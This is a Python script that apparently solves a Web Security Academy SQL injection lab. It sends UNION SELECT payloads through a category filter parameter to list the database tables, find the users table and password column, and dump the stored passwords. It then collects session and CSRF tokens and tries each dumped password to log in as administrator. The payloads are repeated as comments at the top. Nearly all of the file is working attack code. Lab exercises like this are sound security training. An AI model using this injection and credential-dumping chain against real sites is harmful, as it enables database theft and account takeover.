import re
import requests
from colorama import Fore

#1'ORDER+BY+2--
#1'UNION+SELECT+null,table_name+FROM+all_tables--
#1'UNION+SELECT+null,column_name+FROM+all_tab_columns+WHERE+table_name+=+'USERS_PHTFEM'--
#1'UNION+SELECT+null,PASSWORD_DBTSEB+FROM+USERS_PHTFEM--

LAB_URL = "https://0a270076031535e681ed57dc008a0025.web-security-academy.net"

def main():
    print("[1] Injecting payload to retrieve the users table")
    payload =  "1'UNION+SELECT+null,table_name+FROM+all_tables--"
    injection = fetch(f"/filter?category={payload}")
    users_table = re.findall("<td>(USERS_.*)</td>", injection.text)[0]
    print(users_table)

    print("[2] Adjusting payload to retrieve the password column for the users table")
    payload= "1'UNION+SELECT+null,column_name+FROM+all_tab_columns+WHERE+table_name+=+'USERS_PHTFEM'--"
    injection = fetch(f"/filter?category={payload}")
    password_column = re.findall("<td>(PASSWORD_.*)</td>", injection.text)[0]
    print(password_column)

    print("[3] Adjutsting payload to retrieve the passwords")
    payload="1'UNION+SELECT+null,PASSWORD_DBTSEB+FROM+USERS_PHTFEM--"
    injection=fetch(f"/filter?category={payload}")
    passwords = re.findall("<td>(.*)</td>",injection.text)
    print(passwords)

    
    login_page = fetch("/login")

    session_token = login_page.cookies.get("session")
    print(session_token)
    csrf_token = re.findall(r'ame="csrf" value="([^"]+)"' , login_page.text)[0]
    print(csrf_token)
     

    for password in passwords:
        print("Trying to log in with " + password + " password ...")
        data = {"username": "administrator", "password": password, "csrf": csrf_token}
        cookies = { "session": session_token }
        admin_login = post_data("/login", data, cookies)
        

def fetch(path, cookies = None):
    try:
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=True)
    except:
        print("error fecthing " + LAB_URL + path)
        exit(1)

def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=True)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)

if __name__ == "__main__":
    main()